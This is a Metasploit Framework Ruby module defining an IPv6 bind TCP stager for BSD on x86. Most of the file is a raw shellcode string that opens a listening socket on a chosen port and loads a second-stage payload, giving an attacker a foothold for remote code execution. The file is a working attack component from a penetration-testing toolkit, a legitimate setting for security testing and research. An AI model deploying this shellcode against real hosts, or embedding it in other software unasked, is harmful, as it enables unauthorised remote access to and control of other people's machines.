##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# BSD bind TCP stager.
#
###
module Metasploit3

	include Msf::Payload::Stager

	def self.handler_type_alias
		"bind_ipv6_tcp"
	end

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager (IPv6)',
			'Description'   => 'Listen for a connection over IPv6',
			'Author'        =>  ['skape', 'vlad902', 'hdm'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 26, 'n'    ],
						},
					'Payload' =>
						"\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\x89\xc3\x31" +
						"\xd2\x52\x52\x52\x52\x52\x52\x68\x1c\x1c\xbf\xbf\x89\xe1\x6a\x1c" +
						"\x51\x50\x6a\x68\x58\x50\xcd\x80\xb0\x6a\xcd\x80\x52\x53\xb6\x10" +
						"\x52\xb0\x1e\xcd\x80\x51\x50\x51\x97\x6a\x03\x58\xcd\x80\xc3"
				}
			))
	end

end
